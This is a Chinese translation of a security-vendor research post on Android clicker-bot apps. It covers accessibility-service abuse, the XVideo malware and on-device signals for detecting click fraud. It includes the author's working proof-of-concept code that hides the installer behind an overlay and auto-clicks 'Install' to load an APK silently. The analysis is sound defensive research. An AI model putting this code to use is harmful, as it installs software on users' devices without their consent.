> 原文链接: https://www.anquanke.com//post/id/87252 


# 【技术分享】点击型僵尸app：能够自动点击的安卓僵尸app（下）


                                阅读量   
                                **146308**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：安全客
                                <br>原文地址：[https://blog.zimperium.com/clicking-bot-applications/](https://blog.zimperium.com/clicking-bot-applications/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p1.ssl.qhimg.com/t01a629177e2e3927ed.png)](https://p1.ssl.qhimg.com/t01a629177e2e3927ed.png)

**译者****：**[**興趣使然的小胃**](http://bobao.360.cn/member/contribute?uid=2819002922)

**预估稿费：200RMB**

**投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿**



**传送门**

****

[******【技术分享】点击型僵尸app：能够自动点击的安卓僵尸app（上）**](http://bobao.360.cn/learning/detail/4686.html)



**四、利用无障碍辅助服务的CBA**

****

[无障碍服务](https://developer.android.com/reference/android/accessibilityservice/AccessibilityService.html)是Android平台提供的一种服务，该服务提供了一种用户界面增强功能，可以帮助残障用户或者暂时无法与设备完全交互的用户。

无障碍服务的服务对象本来只局限于使用Android设备及应用的残障人士。应用程序可以通过这种服务来发现在屏幕上显示的UI小部件，查询这些部件的内容，以程序方式与这些部件交互。利用这些功能，残障用户可以更好地访问Android设备。

恶意软件一直以来都在滥用无障碍服务（Accessibility Service Abuse，ASA）来发起攻击，如[DoubleLocker](https://blog.zimperium.com/detecting-doublelocker-ransomware/)勒索软件以及Shedun恶意软件（也叫做Kemoge、Shiftybug以及Shuanet）等大规模攻击事件中就用到过这一技术。

应用可以使用无障碍服务以及（或者）顶层绘制（[Draw on Top](https://developer.android.com/reference/android/Manifest.permission.html#SYSTEM_ALERT_WINDOW)）权限，创建一个位于所有其他应用顶层的窗口，这种攻击手法也称之为[“Cloak &amp; Dagger”攻击](http://cloak-and-dagger.org/)。利用这种攻击手法，恶意应用可以完全控制UI反馈闭环，悄无声息接管整个设备。

其他类型的CBA无需请求任何权限，而**Cloak &amp; Dagger（以下简称C&amp;D）**攻击需要请求SYSTEM_ALERT_WINDOW（顶层绘制）以及BIND_ACCESSIBILITY_SERVICE（无障碍服务）权限。如果应用的安装渠道源自于Play Store，那么该应用会自动获得SYSTEM ALERT WINDOW权限。

这两个权限结合起来可以实现某些恶意软件所具备的功能：

**1、静默安装应用。由于安装过程无需用户同意，应用程序可以变成上帝应用（启用了所有权限），或者换句话说，该应用可以安装间谍软件。**

**2、发起非常完美的隐蔽钓鱼攻击。**

**3、将PIN码改成攻击者控制的PIN码，阻止用户访问设备（然后要求用户支付赎金）。**

**4、记录用户键盘操作，可以窃取密码（只需获得无障碍服务权限）。**

我们来演示一下某款Android CBA如何滥用无障碍服务，不经用户许可安装其他Android应用。

前文提到的广告欺诈点击行为在设备上的表现非常明显，然而在设备端我们无法发现基于安装欺诈或者流量欺诈的欺诈行为，但可以使用基于服务端信息的其他识别方法进行检测。

本文所研究的是CBA网络的营收问题，因此，为实现利益最大化，应用程序可能会安装多个广告软件或者CBA程序。无论如何，能够发起C&amp;D攻击的CBA比单纯的广告欺诈点击软件更为可恶，原因如下：

1、Android应用可以使用[**VirtualApp**](https://github.com/asLody/VirtualApp)框架或基于[**DexClassLoader**](https://developer.android.com/reference/dalvik/system/DexClassLoader.html)的其他技术来动态加载不受监管的代码。这些代码可能是勒索软件或者能够窃取密码的间谍软件。

2、所安装的应用无需经过用户许可，没有经过Google Play Store的校验，因此可以是勒索软件或者窃取密码的间谍软件，也可以动态加载未受监管的类似代码安装其他恶意软件。

我之前也发现过使用自动点击技术完成应用安装的案例，但这里我想以自己写的概念验证代码（PoC）为例子来介绍。自己的代码更加干净整洁，通过逆向工程方法提取的其他代码还存在部分混淆情况，不便于分析。

接下来介绍的这个示例应用可以通过如下方法来安装其他应用程序：

1、在manifest中注册AccessibilityService，配置intent过滤器，设置&lt;intent-filter&gt;的name属性值为**accessibilityservice.AccessibilityService**。

2、如果尚未获得无障碍服务权限，则以“合理的”理由请求该权限。

3、为了隐藏安装窗口，使用一个布局（layout）填充整个屏幕，该布局使用**LayoutParams.TYPE_SYSTEM_ALERT**标志。

4、开始安装本地apk文件。

5、过滤**AccessibilityService**，在android.packageinstaller软件包中，查找**PackageInstallerActivity**中的**AccessibilityEvent**。

6、通过**findAccessibilityNodeInfosByText**方法，查找待点击的安装按钮。

7、使用**performAction(AccessibilityNodeInfo.ACTION_CLICK)**语句自动点击按钮。

8、撤掉上层覆盖窗口（如果使用过顶层窗口的话）。

在Manifest文件中注册**AccessibilityService**，如下所示：



```
&lt;service
   android:name=".AccessibilityServiceImpl"
   android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"&gt;
   &lt;intent-filter&gt;
       &lt;action android:name="android.accessibilityservice.AccessibilityService"/&gt;
   &lt;/intent-filter&gt;
   &lt;meta-data
       android:name="android.accessibilityservice"
       android:resource="@xml/help"/&gt;
&lt;/service&gt;
```

如果尚未获得无障碍服务权限，则以“合理的”理由请求该权限。



```
private static final String SERVICE_NAME    = "money.for.nothing/.AccessibilityServiceImpl";

private boolean isAccessibilityServiceEnabled() `{`
   List&lt;AccessibilityServiceInfo&gt; accessibilityServices =
           mAccessibilityManager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_GENERIC);
   for (AccessibilityServiceInfo info : accessibilityServices) `{`
       if (info.getId().equals(SERVICE_NAME)) `{`
           return true;
       `}`
   `}`
   Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
   startActivity(intent);
   return false;
`}`
```

使用“合适”的上下文环境来隐藏安装窗口。



```
final WindowManager.LayoutParams params = new WindowManager.LayoutParams(
       WindowManager.LayoutParams.MATCH_PARENT,
       WindowManager.LayoutParams.MATCH_PARENT,
       WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
       WindowManager.LayoutParams.FLAG_FULLSCREEN,
       PixelFormat.TRANSLUCENT);
LayoutInflater li = (LayoutInflater) getSystemService(LAYOUT_INFLATER_SERVICE);
View mainView = null;switch (process) `{`   case PAYMENT:
       mainView = li.inflate(R.layout.money_for_nothing_installing, null);       break;   case LOCATION:
       mainView = li.inflate(R.layout.money_for_nothing_setting, null);       break;   case UNINSTALL:
       mainView = li.inflate(R.layout.money_for_nothing_searching, null);
       Break; case INSTALL:
       mainView = li.inflate(R.layout.money_for_nothing_loading, null);
       Break;
`}`final View finalMainView = mainView;
_windowManager.addView(mainView, params);
```

开始安装本地apk文件。



```
String path = "/storage/emulated/legacy/Download/zanti3.01.apk";

if (isAccessibilityServiceEnabled()) `{`
     Intent promptInstall = new Intent(Intent.ACTION_VIEW)
           .setDataAndType(Uri.parse("file://"+ path),
                   "application/vnd.android.package-archive");
   startActivity(promptInstall);
   
`}`
```

找到并点击“Install button”（安装按钮）。



```
public class HelpService extends AccessibilityService `{`
  
    private static final CharSequence PACKAGE         = "com.android.packageinstaller;      
   
    @TargetApi(Build.VERSION_CODES.JELLY_BEAN) @Override public void onAccessibilityEvent(final AccessibilityEvent event) `{`
        if(null == event || null == event.getSource()) `{` return; `}`
      


        if(event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &amp;&amp;
                event.getPackageName().equals("com.android.packageinstaller"))`{`
            if(className.endsWith("PackageInstallerActivity"))`{`
                simulationClick(event, "Install");             
            `}`         
        `}`
    `}`

    @TargetApi(Build.VERSION_CODES.JELLY_BEAN) private void simulationClick(AccessibilityEvent event, String text)`{`
        Log.v("click", "simulationClick: "+ text);
        List&lt;AccessibilityNodeInfo&gt; nodeInfoList = event.getSource().findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo node : nodeInfoList) `{`
            if (node.isClickable() &amp;&amp; node.isEnabled()) `{`
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            `}`
        `}`
    `}`

    @Override public void onInterrupt() `{` `}`
`}`
```



**XVideo恶意软件分析**



接下来我们来分析一下“XVideo”恶意软件，这款恶意软件所作的操作与上述操作类似，唯一的不同是它并没有隐藏安装过程。

这款恶意软件同样实现了一些典型的恶意软件功能，以规避Google Play上的恶意软件检测机制，比如：

1、虽然应用的包名各不相同，但所有activity的名字都采用“pronclub.*”格式。



```
&lt;application android:name=“org.gro.jp.fjksbxcvbcxnnxlsdtApp” …&gt;
&lt;activity android:name=“com.pronclub.GdetailActivity” /&gt;
&lt;activity android:name=“com.pronclub.GwebActivity” /&gt;
&lt;activity android:name=“com.pronclub.GpointActivity” /&gt;
```

**2、应用程序在assets目录中存放APK文件。**APK头部数据使用滚动式异或算法（rolling XOR）进行编码，通过**DexClassLoader**动态加载dex代码。

```
DexClassLoader dLoader = new DexClassLoader(str, str2, str4, (ClassLoader) fjksbxcvbcxnnxswdpkff.getFieldfjksbxcvbcxnnxklOjbect(fjksbxcvbcxnnxalldd[3], wrfjksbxcvbcxnnx.get(), fjksbxcvbcxnnxalldd[4]));
```

3、这款CBA注册了一个无障碍服务，服务名为“Play decoder++”。在代码中，该字符串的属性名为“auto install service”，与其真实功能非常贴切。



```
&lt;string name=”acc_auto_install_service_name”&gt;[Decoder] Play Decoder++&lt;/string&gt;
&lt;service android:label=”@string/acc_auto_install_service_name” android:name=”com.ted.android.service.bni” android:permission=”android.permission.BIND_ACCESSIBILITY_SERVICE”&gt;
```



**五、其他点击欺诈方法**

****

点击欺诈是一种非常狡猾的犯罪行为，它会使用各种方法来绕过检测技术。在判断某个应用是否脱离用户交互过程，实施点击欺诈行为时，我们应注意其中一些方法或者参数，根据这些因素来具体判断：

1、应用所点击的区域是否超出应用UI组件范围？（比如Facebook应用点击了WhatsApp应用）

2、应用请求哪些权限？

3、应用是否请求Root权限，或者是否以系统应用身份运行？（位于**/system/app**目录下的应用通常带有操作系统的签名）

4、应用行为是否在设备上可见？前文提到过，服务端负责基于信息收集的观察方法，与应用所使用的点击方法无关。

当用户点击某个Android UI组件（**ViewGroup**）时，操作系统或广告SDK所得到的输出结果如下所示。比如，一次用户点击事件会生成两个MotionsEvent ，分别对应手指按下以及手指抬起动作：

```
MotionEvent `{` action=ACTION_DOWN, id[0]=0, x[0]=198.75, y[0]=63.42859, toolType[0]=TOOL_TYPE_FINGER, buttonState=0, metaState=0, flags=0x0, edgeFlags=0x0, pointerCount=1, historySize=0, eventTime=18381654, downTime=18381654, deviceId=6, source=0x1002 `}`
MotionEvent `{` action=ACTION_UP, id[0]=0, x[0]=198.75, y[0]=63.42859, toolType[0]=TOOL_TYPE_FINGER, buttonState=0, metaState=0, flags=0x0, edgeFlags=0x0, pointerCount=1, historySize=0, eventTime=18381742, downTime=18381654, deviceId=6, source=0x1002 `}`
```

这里我们定义一个术语：设备端检测（on-device-detection）技术，即能否通过上述MotionEvent 参数发现欺诈点击行为。

**5.1 使用Android平台的dispatchTouchEvent API**

如前文所述，这个API的特点为：

1、只能点击应用自己的UI组件。

2、无需请求任何权限就能运行。

3、无需root权限或以系统应用运行就能提交操作。

前面我们给出了**com.life.read.physical.trian**反编译后的源代码，如果使用这份代码来操作点击行为，那么只需要注意几个参数就能发现欺诈行为。

首先是source=0x1002，其次是TOOL_TYPE_UNKNOWN。

应用可以保存引用信息，回收一些Android UI组件（如MotionEvent.PointerCoords、MotionEvent.PointerProperties等），设置其他“source”属性值，在私有API上使用反射（reflection）机制，通过这些操作，应用在设备上的所作所为对用户而言会变得完全透明。

这些技巧如果应用得当，就能真正达到不劳而获的效果。

**5.2 滥用无障碍服务**

如前文所述，这个服务具备如下特点：

1、可以点击其他组件。

2、需要请求BIND_ACCESSIBILITY_SERVICE权限。启动无障碍服务需要由用户在设备设置中启用该服务选项。

3、无需[root权限](https://en.wikipedia.org/wiki/Rooting_(Android))或以系统级应用运行。

这类欺诈行为对应“toolType[0]=TOOL_TYPE_UNKNOWN”，因此很容易识别。

虽然我们可以通过设备上的点击欺诈特征发现广告欺诈软件，然而无法发现安装欺诈或者流量欺诈型软件，但我们还是可以使用基于服务端信息的其他识别方法加以检测。

**5.3 使用Android底层输入管道**

[Android输入子系统](https://source.android.com/devices/input/touch-devices)（Android input subsystem）中包含一个贯穿多层子系统的事件管道（event pipeline）。shell用户可以使用“input”程序来创建触摸事件。

这种方法特点如下：

1、可以点击其他组件。

2、无需任何权限就能运行。

3、需要Shell用户权限，也就是说Root权限足以满足需求。

使用这种方法时，在设备上的点击事件会带有“toolType[0]=TOOL_TYPE_UNKNOWN”参数，可借此来识别欺诈行为。

**5.4 在“InputManager”类的injectInputEvent方法上使用反射技术**

欺诈应用可以在[InputManager](https://developer.android.com/reference/android/hardware/input/InputManager.html)上使用[Java的反射（Reflection）API](https://docs.oracle.com/javase/tutorial/reflect/)，这种方法的特点如下：

1、可以点击应用组件。以shell用户运行时可以点击其他组件。

2、无需任何权限就能运行。

3、可能需要以系统应用身份运行，具体取决于所使用的操作系统以及设备。

使用这种方法时，在设备上的点击事件会带有“toolType[0]=TOOL_TYPE_UNKNOWN”参数，可借此来识别欺诈行为。

攻击者还可以使用其他一些方法来实施广告欺诈、安装欺诈以及数据流量欺诈行为，比如：

1、篡改广告SDK。

2、逆向广告SDK，使用反射技术发送伪造的事件。

3、Hook广告ADK或者系统UI。

<br>

**六、总结**

****

随着时间的推移，CBA也变得越来越复杂。为了能够随意玩弄操作系统，使用最新开发工具包的应用开发者可以采取各种各样的创新手法。综合利用各种方法后，CBA可能会完全规避现有的检测技术，除非我们能找到更加有效的实时检测方法，才能从设备中移除这类恶意应用。

未来，广告业的龙头服务商需要采取相应的防御手段或保护方法，来对抗僵尸软件以及点击欺诈软件，避免向欺诈行为支付金钱。应用开发者需要提供诸如[zIAP™](https://www.zimperium.com/ziap-in-app-protection)的全面保护方案，来实时监测欺诈软件及移动恶意软件。如果缺少此类保护机制，那么每次点击时，未受保护的开发者以及设备所能得到的收益就会受到影响。

本文列举了点击欺诈行为的几个案例并做了相关分析，希望读者阅读本文后能有所收获。zLabs对这类行为的研究领域涵盖应用、移动操作系统以及硬件领域，目标是研发最好的移动安全产品及服务，保护个人及企业信息。

如果你有具体问题或者想向zLabs或其他团队反馈意见及建议，欢迎通过这个页面来联系我们。

感谢zLabs的所有研究人员，特别是Matteo Favaro （[@fvrmatteo](https://twitter.com/fvrmatteo)），以上研究成果离不开他们的帮助。
